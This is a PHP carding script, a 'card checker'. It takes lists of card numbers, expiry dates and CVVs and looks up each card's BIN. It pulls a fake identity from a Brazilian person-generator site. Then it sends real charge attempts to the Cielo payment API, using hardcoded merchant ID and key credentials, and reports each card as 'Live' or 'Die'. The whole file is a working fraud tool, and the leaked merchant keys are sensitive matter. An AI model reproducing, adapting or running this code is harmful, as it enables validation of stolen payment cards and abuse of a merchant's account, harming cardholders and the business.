<?php
//PASSEI PRA FALAR QUE O FLUX É GAY KKKK, FLUX TE AMOOOO
//header('content-type: application/json');
error_reporting(0);
set_time_limit(0);

list($card, $mes, $ano, $cvv) = explode("|", str_replace(array(",", "»", "|", ":"), "|", $_REQUEST['lista']));

$re = array(
  "Visa" => "/^4[0-9]{12}(?:[0-9]{3})?$/",
  "Master" => "/^5[1-5]\d{14}$/",
  "Amex" => "/^3[47]\d{13,14}$/",
  "elo" => "/^((((636368)|(438935)|(504175)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(4011))\d{0,12})$/",
  "hipercard" => "/^(606282\d{10}(\d{3})?)|(3841\d{15})$/",
);



$bin1 = substr($card, 0, 6); 
$file = 'bins.csv'; 
$searchfor = $bin1; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
    $encontrada = implode("\n", $matches[0]); 
} 
$pieces = explode(";", $encontrada); 
$c = count($pieces); 
if ($c == 8) { 
    $pais = $pieces[4]; 
    $paiscode = $pieces[5]; 
    $banco = $pieces[2]; 
    $level = $pieces[3]; 
    $bandeira = $pieces[1]; 
} else { 
    $pais = $pieces[5]; 
    $paiscode = $pieces[6]; 
    $link = $pieces[7]; 
    $level = $pieces[4]; 
    $banco = $pieces[2]; 
    $bandeira = $pieces[1]; 
}

//unlink("cookie.txt");




function request($url, $post = false, $header = false)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  if ($post) {
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
  }
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
  if ($header) {
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
  }
  $exec = curl_exec($ch);
  return $exec;
}






       $ch = curl_init();      
        curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIESESSION, 1 );
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(  "host: www.4devs.com.br",
  "origin: https://www.4devs.com.br",
  "referer: https://www.4devs.com.br/gerador_de_pessoas",
  "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
));
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);  
        curl_setopt($ch, CURLOPT_REFERER, "");
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=PB&txt_qtde=1&cep_cidade=');

  $x = curl_exec($ch);

$json = json_decode($x, true);











 $nome = json_decode($x, true)['nome'];
 $cpf = json_decode($x, true)['cpf'];
 $email = json_decode($x, true)['email'];
 $cep = json_decode($x, true)['cep'];
 $endereco = json_decode($x, true)['endereco'];
 $bairro = json_decode($x, true)['bairro'];
 $numero = json_decode($x, true)['numero'];
 $celular = json_decode($x, true)['celular'];
 $data_nasc = json_decode($x, true)['data_nasc'];
 $cidade = json_decode($x, true)['cidade'];
 $estado = json_decode($x, true)['estado'];


    switch ($ano) {
         case '20':
         $ano = '2020';
         break;
         case '21':
         $ano = '2021';
         break;
         case '22':
         $ano = '2022';
         break;
         case '23':
         $ano = '2023';
         break;
         case '24':
         $ano = '2024';
         break;
         case '25':
         $ano = '2025';
         break;
         case '26':
         $ano = '2026';
         break;
         case '27':
         $ano = '2027';
         break;
         case '28':
         $ano = '2028';
         break;
         case '29':
         $ano = '2029';
         break;
      } 
      switch ($mes) {
         case '1':
         $mes = '01';
         break;
         case '2':
         $mes = '02';
         break;
         case '3':
         $mes = '03';
         break;
         case '4':
         $mes = '04';
         break;
         case '5':
         $mes = '05';
         break;
         case '6':
         $mes = '06';
         break;
         case '7':
         $mes = '07';
         break;
         case '8':
         $mes = '08';
         break;
         case '9':
         $mes = '09';
         break;
     }
  $rndCodigo = rand(111111111,9999999999);
  $rand_value = mt_rand(10,1000);




$post2 = '{
   "MerchantOrderId":"'.$rndCodigo.'",
   "Customer":{
      "Name":"'.$nome.'"
   },
   "Payment":{
     "Type":"CreditCard",
     "Amount":'.$rand_value.',
     "Installments":1,
     "SoftDescriptor":"CIELOPLINC",
     "CreditCard":{
         "CardNumber":"'.$card.'",
         "Holder":"'.$nome.'",
         "ExpirationDate":"'.$mes.'/'.$ano.'",
         "SecurityCode":"'.$cvv.'",
         "Brand":"Visa",
         "CardOnFile":{
            "Usage":"First",
            "Reason":"Unscheduled"
         }
     },
     "IsCryptoCurrencyNegotiation": false
   }
}';





       $ch = curl_init();      
        curl_setopt($ch, CURLOPT_URL, "https://api.cieloecommerce.cielo.com.br/1/sales");
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
       // curl_setopt($ch, CURLOPT_PROXY, "gate.dc.smartproxy.com:20000");
    //   curl_setopt($ch, CURLOPT_PROXYUSERPWD, "user:pass");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);       
        curl_setopt($ch, CURLOPT_COOKIESESSION, 1 );
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('MerchantId: 82bfd016-ecd3-461d-8af2-a7c9fe0fc9fd',
  'MerchantKey: D8GyQ9Xg2KrPxSYOFcBHDkU6komNvZjobZn3oKwx',
  'Content-Type: application/json'
));
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);  
        curl_setopt($ch, CURLOPT_REFERER, "");
    curl_setopt($ch, CURLOPT_POSTFIELDS, ''.$post2.'');

  $d1 = curl_exec($ch);

$json = json_decode($d1, true);

//print_r($json);

if($json['Payment']['ReturnMessage'] === "Transacao autorizada") {
  echo json_encode(array("status" => 0, "msg" => "Live $card $mes $ano $cvv - $bandeira $banco $level $pais ($paiscode) $link - ({$json['Payment']['ReturnCode']}) {$json['Payment']['ReturnMessage']}<br>"));
} else if ($json['Payment']['ReturnCode'] === "GD") {
  echo json_encode(array("status" => 2, "msg" => "Die $card $mes $ano $cvv - $bandeira $banco $level $pais ($paiscode) $link - ({$json['Payment']['ReturnCode']}) {$json['Payment']['ReturnMessage']}<br>"));
} else if ($json[0]['Message']) {
  echo json_encode(array("status" => 1, "msg" => "Die $card $mes $ano $cvv - $bandeira $banco $level $pais ($paiscode) $link - ({$json[0]['Message']})<br>"));
} else {
  echo json_encode(array("status" => 1, "msg" => "Die $card $mes $ano $cvv - $bandeira $banco $level $pais ($paiscode) $link - ({$json['Payment']['ReturnCode']}) {$json['Payment']['ReturnMessage']}<br>"));
        fclose($fp);
}